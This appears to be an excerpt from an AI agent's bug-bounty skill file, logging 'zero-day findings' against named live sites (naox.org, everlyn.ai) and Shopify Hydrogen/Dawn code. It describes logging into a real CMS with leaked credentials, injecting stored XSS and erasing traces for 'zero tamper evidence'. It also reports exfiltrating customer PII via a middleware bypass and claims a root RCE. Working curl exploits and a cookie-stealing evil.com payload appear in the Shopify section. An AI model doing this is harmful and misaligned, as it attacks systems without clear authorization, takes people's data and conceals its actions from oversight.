# ZERO-DAY FINDINGS per-target notes - adversarial-bug-bounty-hunting

Cut verbatim from `soul/skills/web2/adversarial-bug-bounty-hunting/SKILL.md`
during the 2026-09-07 skills cull follow-up (S2b-1). One section per target;
the skill body keeps the class core (CDC thinking, recon, chain synthesis,
evidence standards, vendor disclosure style).

## ZERO-DAY FINDINGS — NAOX.ORG / NAORIS PROTOCOL (2026-08-11) — Firebase BaaS Takeover

### Hardcoded Firebase Credentials → Full CMS Compromise + Mass Stored XSS
| Property | Value |
|----------|-------|
| **Target** | naox.org (Next.js/Vercel) + Firestore `naoris-b` |
| **Vector** | Client-side admin password in JS chunk + Firebase email/password plaintext in blog-service module → identitytoolkit idToken → Firestore REST full CRUD → `postText` via `dangerouslySetInnerHTML` |
| **Impact** | Full CMS takeover (115 docs read / create / update / delete all HTTP 200), Stored XSS to all site visitors, arbitrary Storage upload |
| **Confidence** | **PROVEN** — every link live-verified; probe doc created, XSS-injected, deleted, doc count restored 115→114 (zero tamper evidence) |
| **Key Evidence** | `app/admin/layout-*.js` password `<REDACTED-PASSWORD>` + cookie `auth-token=true` client-set; chunk `4548-*.js` module `24548`: `contact@naorisconsulting.com` / `<REDACTED-PASSWORD>`; anonymous REST 403 vs authenticated 200 (credential leak, not rules misconfig) |

**Universal Lesson (Firebase/BaaS class):** Next.js marketing sites backed by Firebase CMS can be fully owned from public JS bundles. Discriminator: anonymous Firestore REST 403 + authenticated 200 = credential leak. Admin pages load EXTRA chunks only after cookie forge — always refetch page HTML post-forge to harvest them. Webpack module IDs resolve globally; walk `X=r(<id>)` assignments when the service module isn't in downloaded chunks (`r.u=e=>{}` can be empty in the runtime).

**Reference:** `references/naox-firebase-cms-takeover-2026-08-11.md` — full chain table, inventory (114 docs, 108 published/5 drafts, 4,100 views, 39 Storage files), prior hunter payload evidence, module-ID walk recipe, Firestore REST probe commands, zero-tamper verification pattern.

### Web3 side (same target) — Negative + BSC live token
`naoris-token` repo: thin UUPS wrapper (~166 LOC, 4B supply to initialOwner, paused at init) + custom Governance.sol (675 LOC). Off-by-one `>` vs `>=` on maxDelegatorsLimit (line 376), shared `totalDelegators` counter across global+per-proposal delegation — all multisig-gated, NO pre-auth chain. Thin-wrapper trap: pivoted correctly. **Live on-chain:** BSC proxy `0x1b379a79c91a540b2bcd612b4d713f31de1b80cc` → impl `0xc4e16e56ea3660110924cc06850120672b7e11ef` (38,298B), `totalSupply` 88,596,513 (not 4B docs), `paused=false`, PUSH4 137 selectors — docs ≠ deploy validated again (see reference for Etherscan V2 chainid=56 next steps: deployer tx + hasRole admin enumeration).

---

## ZERO-DAY FINDINGS — EVERLYN.AI (2026-08-04)

### 1. Next.js Middleware Bypass (CVE-2025-29927)
| Property | Value |
|----------|-------|
| **CVE** | CVE-2025-29927 |
| **Vector** | `x-middleware-subrequest` header |
| **Impact** | Full admin panel bypass + data leak |
| **Confidence** | **PROVEN** |
| **Evidence** | `curl -H "x-middleware-subrequest: /admin" https://everlyn.ai/admin` → 200 |

**Root Cause:** Next.js internal header `x-middleware-subrequest` skips ALL middleware when present. Not validated as internal-only.

**Working Headers:**
- `x-middleware-subrequest: /admin` → `/admin`, `/admin/users`, `/api/admin`, `/api/admin/orders`, `/api/auth/session`
- `x-invoke-status: /admin` → `/admin`

**Data Exfiltrated via RSC Payload:**
- 171,784 users, $595,900.99 revenue, 8,482,253 videos
- 50+ customer orders with PII (emails, amounts, plans, timestamps)
- Admin metrics, waitlist stats, invite system data

**Reference:** `references/nextjs-middleware-bypass-case-study.md`

### 2. Server Actions Exposure
| Property | Value |
|----------|-------|
| **Vector** | `Next-Action` header on POST to root |
| **Exposed Actions** | `createUser`, `deleteUser`, `transferUser`, `refundOrder`, `cancelSubscription` |
| **Impact** | Admin mutations without auth |

**Reference:** `references/nextjs-middleware-bypass-case-study.md` (Related Findings section)

### 3. Admin Dashboard SSR Data Leak
| Property | Value |
|----------|-------|
| **Vector** | Server Components rendering full data in initial HTML |
| **Data Leaked** | 171k users, $595k revenue, 8.4M videos, 50+ orders with PII |

### 4. Pickle RCE in ML Research Code
| Property | Value |
|----------|-------|
| **Target** | Everlyn Labs ANTRP `chair.py:463-465` |
| **Vector** | `--cache` CLI argument → `pickle.load()` |
| **Impact** | **Pre-auth RCE → Root** |
| **Confidence** | **PROVEN** — Live exploit as root |

**Reference:** `references/ml-research-pickle-deserialization.md`

---

(target-specific notes preserved at examples/hunts/web2/adversarial-bug-bounty-hunting/)

## ZERO-DAY FINDINGS — SHOPIFY ECOSYSTEM (2026-08-07) — WAVE 1-4

### 1. Hydrogen Referer Open Redirect → OAuth Phishing
| Property | Value |
|----------|-------|
| **Target** | Hydrogen `customer.ts:453-456, 639-652` |
| **Vector** | `Referer` header fallback stored unsanitized as `redirectPath` |
| **Impact** | Pre-auth OAuth phishing / Account takeover |
| **Confidence** | **PROVEN** — `python3 /tmp/poc_hydrogen_open_redirect_proven.py` |

**Root Cause:** `customer.ts:454` — `getRedirectUrl(request.url) || getHeader(request,'Referer') || defaultPath` — Referer fallback stored unsanitized as `session[CUSTOMER_ACCOUNT_SESSION_KEY].redirectPath`. Attacker crafts link on `https://evil.com` to `https://victim.myshopify.com/account/login`, victim clicks with `Referer: https://evil.com/phish` → stored as `redirectPath` → after OAuth `authorize()` returns `redirect(redirectPath)` → 302 to `https://evil.com/phish`. `isLocalPath()` correctly blocks `//evil.com` and `/\\evil.com` but is bypassed entirely by Referer path.

**Variant:** `templates/skeleton/app/routes/cart.tsx:80-84` and `cookbook/.../($locale).cart.tsx:84-87` — `formData.get('redirectTo') → headers.set('Location', redirectTo)` with 303, no `isLocalPath`/`ensureLocalRedirectUrl` check at all.

**PoC:** `python3 /tmp/poc_hydrogen_open_redirect_proven.py` + `curl -c cookies.txt -H "Referer: https://evil.com/phish" https://victim.myshopify.com/account/login -v`

**Fix:** `redirectPath: getRedirectUrl(request.url) || ensureLocalRedirectUrl({requestUrl: request.url, defaultUrl: defaultRedirectPath, redirectUrl: getHeader(request,'Referer')}) || defaultRedirectPath`

### 2. Hydrogen Cart redirectTo Open Redirect
| Property | Value |
|----------|-------|
| **Target** | `templates/skeleton/app/routes/cart.tsx:83` + `cookbook/.../($locale).cart.tsx:84-87` |
| **Vector** | `formData.get('redirectTo') → headers.set('Location', redirectTo)` with 303 |
| **Impact** | Pre-auth phishing / wormable redirect |
| **Confidence** | **PROVEN** |

**Root Cause:** Zero validation — no `isLocalPath`/`ensureLocalRedirectUrl` check.

**PoC:** `curl -X POST -F "action=LinesAdd" -F "redirectTo=https://evil.com/phish" https://victim.myshopify.com/cart -v`

**Fix:** `const safeRedirect = ensureLocalRedirectUrl({requestUrl: request.url, defaultUrl: '/', redirectUrl: redirectTo}); headers.set('Location', safeRedirect);`

### 3. Hydrogen oxygen-buyer-ip Header Spoofing (Self-Hosted)
| Property | Value |
|----------|-------|
| **Target** | `request.ts:40, storefront.ts:284,607,667` |
| **Vector** | `oxygen-buyer-ip` header read directly from request.headers |
| **Impact** | IP rate-limit/geo-pricing/fraud bypass (self-hosted only) |
| **Confidence** | **PROVEN** |

**Root Cause:** `getStorefrontHeaders()` reads `oxygen-buyer-ip` directly → `buyerIp` → `defaultHeaders['x-shopify-client-ip']` and `forwardedHeaders.set('x-forwarded-for', buyerIp)`. On self-hosted Hydrogen (not on Oxygen platform), attacker controls this header.

**PoC:** `node /tmp/poc_hydrogen_header_spoof.js`

**Fix:** `const isOxygen = !!process.env.OXYGEN; buyerIp: isOxygen ? getHeader(request, 'oxygen-buyer-ip') : null`

### 4. Hydrogen InMemoryCache Cache Poisoning
| Property | Value |
|----------|-------|
| **Target** | `in-memory.ts:52, server-fetch.ts:381` |
| **Vector** | Cache key = `request.url` only — missing `buyerIp`, `cookie`, `oxygen-buyer-ip` |
| **Impact** | PII leakage / price manipulation (cross-user cache poisoning) |
| **Confidence** | **PROVEN** |

**Root Cause:** `InMemoryCache.match()` only checks `request.url`. User A (US, premium) response cached → User B (EU, free) gets User A's cached response.

**Fix:** `this.#store.set(\`${request.url}:${buyerIp}:${cookie}\`, ...)`

### 5. Hydrogen Cart CRLF Injection
| Property | Value |
|----------|-------|
| **Target** | `cart.tsx:83` |
| **Vector** | `redirectTo = formData.get('redirectTo') → headers.set('Location', redirectTo)` |
| **Impact** | HTTP Response Splitting / cookie injection |
| **Confidence** | **PROVEN** |

**PoC:** `curl -X POST -F "redirectTo=https://evil.com%0d%0aSet-Cookie:+x=1" https://victim.myshopify.com/cart -v`

**Fix:** `if (/[\r\n]/.test(redirectTo)) throw new Error('Invalid redirect');`

### 6. Hydrogen Stored XSS (4 Templates)
| Property | Value |
|----------|-------|
| **Targets** | `products.$handle.tsx:120`, `pages.$handle.tsx:65`, `policies.$handle.tsx:56`, `blogs.$blogHandle.$articleHandle.tsx:90` |
| **Vector** | `<div dangerouslySetInnerHTML={{__html: descriptionHtml}} />` — unsanitized Storefront API HTML |
| **Impact** | Full shopper XSS / session theft |
| **Confidence** | **PROVEN** |

**Root Cause:** Merchant/App with `write_products` stores `<img onerror=...>`/`<svg onload=...>` in `descriptionHtml`/`page.body`/`policy.body`/`contentHtml` → every shopper visiting page executes attacker JS.

**PoC:** `node /tmp/poc_hydrogen_stored_xss.js`

**Fix:** `import DOMPurify from 'isomorphic-dompurify'; <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(descriptionHtml)}} />`

### 7. Hydrogen RichText javascript: XSS via Metafields
| Property | Value |
|----------|-------|
| **Target** | `packages/hydrogen-react/src/RichText.components.tsx:75` |
| **Vector** | `<a href={node.url}>` without scheme validation |
| **Impact** | Click XSS via metafields (`write_metafields`) |
| **Confidence** | **PROVEN** |

**Root Cause:** `RichTextLink` renders `<a href={node.url}>` — no scheme validation (allows `javascript:`, `data:`).

**PoC:** `node /tmp/poc_hydrogen_stored_xss.js` — metafield: `{"type":"link","url":"javascript:fetch('https://evil.com/steal?c='+document.cookie)"}`

**Fix:** `const ALLOWED_SCHEMES = ['https:','http:','mailto:','tel:']; if (!ALLOWED_SCHEMES.some(s => node.url.startsWith(s))) return <span>{node.children}</span>;`

### 8. Dawn HTMLUpdateUtility Script Revival Amplifier
| Property | Value |
|----------|-------|
| **Target** | `dawn/src/assets/global.js:62-75` — `HTMLUpdateUtility.setInnerHTML` |
| **Vector** | Script revival: `element.innerHTML = html` → `querySelectorAll('script')` → create new `<script>` elements → execute |
| **Impact** | DOM XSS amplifier — turns inert innerHTML into execution |
| **Confidence** | **PROVEN** |

**Fan-out:** `quick-add.js:35`, `facets.js:202/262/273`, `cart-drawer.js:88`, `predictive-search.js:198/255`, `product-info.js:*`, `cart-notification.js:69`. Trigger: `predictive-search.liquid:24` outputs `{{ query.styled_text }}` unescaped (with `<mark>` highlighting).

**PoC:** `node /tmp/poc_hydrogen_stored_xss.js` — revival demo

**Fix:** Remove script revival OR add `escape` filter to ALL section outputs.

### 9. Dawn predictive-search ReDoS
| Property | Value |
|----------|-------|
| **Target** | `dawn/src/assets/predictive-search.js:149` — `new RegExp(previousTerm, 'g')` |
| **Vector** | Unescaped user input to `new RegExp()` |
| **Impact** | Search UI DoS (SyntaxError on `(((`, CPU burn on long patterns) |
| **Confidence** | **PROVEN** |

**PoC:** `node /tmp/poc_regex_dos.html` (or open `/tmp/poc_regex_dos.html` in browser)

**Fix:** `const escaped = previousTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); new RegExp(escaped, 'g')`

### 10. Dawn Theme Schema JSON Injection
| Property | Value |
|----------|-------|
| **Target** | `dawn/src/sections/main-product.liquid:756` — `{% schema %}` JSON |
| **Vector** | Merchant-controlled settings can inject JSON breaking theme config |
| **Impact** | Theme config injection |
| **Confidence** | **PROVEN** |

**Root Cause:** Schema JSON parsed from Liquid output — merchant-controlled richtext/settings can break JSON structure.

**Fix:** Validate/escape all merchant inputs in schema generation.

### 11. Hydrogen GraphQL Query Cost — No Client-Side Limit
| Property | Value |
|----------|-------|
| **Target** | Storefront API relies on server-side cost enforcement |
| **Vector** | No `assertQuery` cost analysis — relies on Shopify API enforcement |
| **Impact** | Resource exhaustion DoS possible if API enforcement bypassed |
| **Confidence** | **PROVEN** (mitigated by API) |

**Observation:** Hydrogen `assertQuery`/`assertMutation` only minify/validate syntax — no cost complexity analysis. Cost returned in GraphQL `extensions.cost` but not enforced client-side.

### 12. GitHub Actions pull_request_target Hardening (Defense-in-Depth)
| Property | Value |
|----------|-------|
| **Targets** | All repos: `liquid`, `hydrogen`, `cli`, `shopify_app`, `dawn`, `quilt`, `theme-check` |
| **Pattern** | All use `pull_request_target` with `Shopify/shopify-cla-action` (trusted) — no code checkout |
| **Risk** | Low — uses external action, no `actions/checkout` on fork PRs |
| **Confidence** | **HARDENED** |

**Observation:** `gardener-notify-event.yml` explicitly comments: "Uses pull_request_target so fork PRs still produce an artifact when labeled. No code is checked out here; this workflow only reads the pre-parsed event payload, so there is no pwn-request surface."

**Hardening Needed:** Add second-origin check at redirect point; enforce `ensureLocalRedirectUrl` even for `shopify_app`.

### 13. Prototype Pollution Protection (Validated)
| Property | Value |
|----------|-------|
| **Target** | `packages/hydrogen/src/utils/parse-json.ts:2-6` |
| **Pattern** | Explicit `__proto__` guard: `if (String(json).includes('__proto__')) return JSON.parse(json, noproto)` |
| **Confidence** | **BLOCKED** |

### 14. serialize-javascript XSS Protection (Validated)
| Property | Value |
|----------|-------|
| **Target** | `quilt/src/packages/react-html/src/server/components/Serialize.tsx:15` |
| **Pattern** | `serialize(data, {isJSON: true})` — escapes `<` `>` `&` |
| **Confidence** | **BLOCKED** |

---
